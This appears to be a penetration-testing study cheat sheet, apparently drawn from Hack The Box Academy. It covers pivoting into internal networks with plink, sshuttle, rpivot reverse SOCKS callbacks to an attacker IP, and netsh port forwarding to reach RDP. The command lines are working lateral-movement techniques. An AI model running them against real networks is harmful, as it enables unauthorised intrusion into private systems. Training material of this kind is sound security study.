## SSH for Windows - plink.exe

```bash
# in Windows Plink used to create dynamic port forwards and SOCKS proxies if SSH not available.
# HACKER : 10.10.x.x, M1:10.10.x.x/172.16.x.x, M2:172.16.x.x
# HACKER(windows):9050==>M1(ubuntu):SOCKS==>M2(windows)

cmd > plink -ssh -D 9050 M1-USER@<M1-ip> # dynamic port frw

# then use Proxifier.exe (https://www.proxifier.com) to confige SOCKS server for 127.0.0.1 and port 9050, video https://www.youtube.com/watch?v=ujsb2pLZUiw
mstsc.exe # RDP access to M2 
```
![](https://academy.hackthebox.com/storage/modules/158/66-1.png)
![](https://academy.hackthebox.com/storage/modules/158/reverse_shell_9.png)

## SSH Pivoting with Sshuttle

```bash
# Sshuttle (https://github.com/sshuttle/sshuttle) it  pivoting python tool 
# dynamic port forwarding
ATTACKER ==> M1(pivot host)==> internal network(172.16.5.0/23) 

sudo sshuttle -r <M1-USER>@<M1-IP> 172.16.5.0/23 -v

# test access to privet network
nmap -v -sV -p3389 172.16.5.19 -A -Pn 
```

## Web Server Pivoting with Rpivot
![](https://academy.hackthebox.com/storage/modules/158/77.png)
```bash
# Rpivot python2 reveerse socks proxy tool, can expose the local port on the external natwork (https://github.com/klsecservices/rpivot.git)
# ATTACKER ==> M1(pivot host)==> Privet_web-server(172.16.5.135) 

# dynamic port frw
  # on the attack host:
  python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
  # on the pivot host (M1)
  python2.7 client.py --server-ip <ATTACKER-IP> --server-port 9999

  proxychains firefox-esr 172.16.5.135:80 # access to the privet web server
  
# Some organizations use HTTP proxies with NTLM auth linked to the Domain Controller; in such cases, rpivot supports NTLM credentials to authenticate through the proxy.
  python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```
## Port Forwarding with Windows Netsh
![[Pasted image 20250619144847.png]]
```bash
Netsh is a Windows command-line tool that can help with the network configuration
# ATTACKER-->M1:8080-->M2(RDP 172.16.5.25:3389)

#  Using Netsh.exe to local Port Forward (ON M1)
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.27.226 connectport=3389 connectaddress=172.16.5.19

netsh.exe interface portproxy show v4tov4  #=>10.129.15.150 8080 172.16.5.25 3389


# on attcker host we connect to priver rdp service
xfreerdp /v:<M1-IP>:8080 /u:<USER> /p:<PASS>
```